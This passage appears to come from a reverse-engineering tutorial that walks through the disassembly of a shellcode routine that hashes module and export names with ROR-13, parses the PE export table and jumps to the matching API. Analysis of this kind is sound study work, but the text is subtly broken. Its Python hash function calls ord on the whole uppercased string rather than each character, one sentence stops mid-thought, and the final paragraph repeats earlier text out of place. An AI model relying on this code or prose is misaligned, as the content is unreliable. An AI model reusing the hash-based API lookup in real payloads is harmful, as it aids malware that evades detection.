```assembly
0x000000000000001c:  31 FF                      xor        edi, edi
0x000000000000001e:  31 C0                      xor        eax, eax
0x0000000000000020:  AC                         lodsb      al, byte ptr [esi]
0x0000000000000021:  3C 61                      cmp        al, 0x61
0x0000000000000023:  7C 02                      jl         0x27
0x0000000000000025:  2C 20                      sub        al, 0x20
0x0000000000000027:  C1 CF 0D                   ror        edi, 0xd
0x000000000000002a:  01 C7                      add        edi, eax
0x000000000000002c:  E2 F0                      loop       0x1e
```

The `lodsb` instruction is exactly why the string was saved in `esi`, why the length was saved in `ecx` and why the direction flag was cleared.
This reads the first ANSI character (byte) pointed by `esi`, promoting `esi` by one and saving the result in the `al` register.
The later parts convert lowercase character to uppercase - if the ASCII code is greater or equal to 0x61 ('a') then is substracts 0x20.
After converting to uppercase, the `edi` register gets rotated-right by 0xd and then the character value is being added to it.
Since `edi` is being rotated - it loses the information about the characters that are added to it but keeps some sort of aggregate of them in its value.
In other words - `edi` is some sort of hash of the string pointed by `esi`. The `loop` instruction, by the way, cleverly takes advantage of the fact that `ecx` is the counter for the string's length - it decreases `ecx` by one and will perform the next iteration as long as `ecx` is not zero.
Translating this logic to Python is quite straightforward:

```python
def get_hash(s):
    v = 0
    for c in s:
        v = (v >> 0xd) | ((v & 0x1fff) << 19)
        v = (v + ord(s.upper())) & 0xffffffff
    return v
```

## Walking the export table
Let us move on to the next couple of instructions:

```assembly
0x000000000000002e:  52                         push       edx
0x000000000000002f:  57                         push       edi
0x0000000000000030:  8B 52 10                   mov        edx, dword ptr [edx + 0x10]
0x0000000000000033:  8B 42 3C                   mov        eax, dword ptr [edx + 0x3c]
0x0000000000000036:  01 D0                      add        eax, edx
0x0000000000000038:  8B 40 78                   mov        eax, dword ptr [eax + 0x78]
0x000000000000003b:  85 C0                      test       eax, eax
0x000000000000003d:  74 4A                      je         0x89
0x000000000000003f:  01 D0                      add        eax, edx
0x0000000000000041:  50                         push       eax
0x0000000000000042:  8B 48 18                   mov        ecx, dword ptr [eax + 0x18]
0x0000000000000045:  8B 58 20                   mov        ebx, dword ptr [eax + 0x20]
0x0000000000000048:  01 D3                      add        ebx, edx
```
First, `edx` (which contains the current module entry) and `edi` (which contains its name's hash) are backed up to the stack.
After that, `edx` is referenced at offset 0x10. Since the list entries are of type `LDR_DATA_TABLE_ENTRY` and that they are pointed after the `LIST_ENTRY` header, 0x10 is the `DllBase` member of the entry (0x18 - 8).
Even in memory, the module has a [PE data structure](https://en.wikipedia.org/wiki/Portable_Executable), and offst 0x3c corresponds to the pointer of the PE header in the DOS header.
We can see `eax` treated as an RVA since it's adding `edx` to itself - `edx` is the module base address in memory.
Similarly, the offset 0x78 from that is the PE export table, which contains information about the exported symbols (commonly functions).
The data structure for it is called `IMAGE_EXPORT_DIRECTORY` and it's [well documented](http://pinvoke.net/default.aspx/Structures.IMAGE_EXPORT_DIRECTORY).
Assuming it is not zero (which is being `test`ed) - we push `eax` and dereference two parts in it:
- At offset 0x18 we get the `NumberOfNames` member.
- At offset 0x20 we get the `AddressOfNames` member.
So, to summarize, this part performed some parsing of the PE to get the export table - and specifically the number of exported symbols (in `ecx`) and their address in memory (in `ebx`). 

Moving on:
```assembly
0x000000000000004a:  E3 3C                      jecxz      0x88
0x000000000000004c:  49                         dec        ecx
0x000000000000004d:  8B 34 8B                   mov        esi, dword ptr [ebx + ecx*4]
0x0000000000000050:  01 D6                      add        esi, edx
```
The `jecxz` instruction jumps if `ecx` is zero - this happens if there are no exported names, but also hints this check will happen in a loop.
The fact we decrease `ecx` confirms that suspicion - we expect some iteration on all exported symbols to match some condition.
We see `ecx` multiplied by 4 and added to `ebx` - all the items in `AddressOfNames` are RVAs to the symbol names, and so `esi` points at an exported name eventually.

```assembly
0x0000000000000052:  31 FF                      xor        edi, edi
0x0000000000000054:  31 C0                      xor        eax, eax
0x0000000000000056:  AC                         lodsb      al, byte ptr [esi]
0x0000000000000057:  C1 CF 0D                   ror        edi, 0xd
0x000000000000005a:  01 C7                      add        edi, eax
0x000000000000005c:  38 E0                      cmp        al, ah
0x000000000000005e:  75 F4                      jne        0x54
```
This part resembles the same hash-calculation we've seen earlier, but instead of using `ecx` as a counter - it calclates the hash until a NUL terminator:
- First, `edi` is assigned with zero (by self-XORing). Just as before - `edi` will maintain the hash value.
- The `eax` register is assigned to zero as well. Its lower byte (`al`) will contain the ASCII code of the current character in each iteration.
- Using `lodsb` the code sets `al` to be the byte pointed by `esi` and increases `esi` to the next byte.
- Just as before, `edi` is right-rotated 0xd times and then the current character ASCII value is added to it.
- The comparison of `al` and `ah` really just compares `al` to zero (NUL terminator), as no operation here touches other bytes of `eax` and we made sure they are zero.
- Instead of using the `loop` instruction (which interacts with `ecx`), we simply jump back (with `jne`) - as long as we did not encounter a NUL terminator.

To summarize - after calculating a rolling hash on a DLL name, 


```assembly
0x0000000000000060:  03 7D F8                   add        edi, dword ptr [ebp - 8]
0x0000000000000063:  3B 7D 24                   cmp        edi, dword ptr [ebp + 0x24]
0x0000000000000066:  75 E2                      jne        0x4a
0x0000000000000068:  58                         pop        eax
0x0000000000000069:  8B 58 24                   mov        ebx, dword ptr [eax + 0x24]
0x000000000000006c:  01 D3                      add        ebx, edx
0x000000000000006e:  66 8B 0C 4B                mov        cx, word ptr [ebx + ecx*2]
0x0000000000000072:  8B 58 1C                   mov        ebx, dword ptr [eax + 0x1c]
0x0000000000000075:  01 D3                      add        ebx, edx
0x0000000000000077:  8B 04 8B                   mov        eax, dword ptr [ebx + ecx*4]
0x000000000000007a:  01 D0                      add        eax, edx
0x000000000000007c:  89 44 24 24                mov        dword ptr [esp + 0x24], eax
0x0000000000000080:  5B                         pop        ebx
0x0000000000000081:  5B                         pop        ebx
0x0000000000000082:  61                         popal      
0x0000000000000083:  59                         pop        ecx
0x0000000000000084:  5A                         pop        edx
0x0000000000000085:  51                         push       ecx
0x0000000000000086:  FF E0                      jmp        eax
0x0000000000000088:  58                         pop        eax
0x0000000000000089:  5F                         pop        edi
0x000000000000008a:  5A                         pop        edx
0x000000000000008b:  8B 12                      mov        edx, dword ptr [edx]
0x000000000000008d:  EB 86                      jmp        0x15
```
Let's recall that `edx` points to the current `LDR_DATA_TABLE_ENTRY` entry and `edi` is the module hash.
After pushing them to the stack (backing them up), the code dereferences `edx` at offset 0x10.
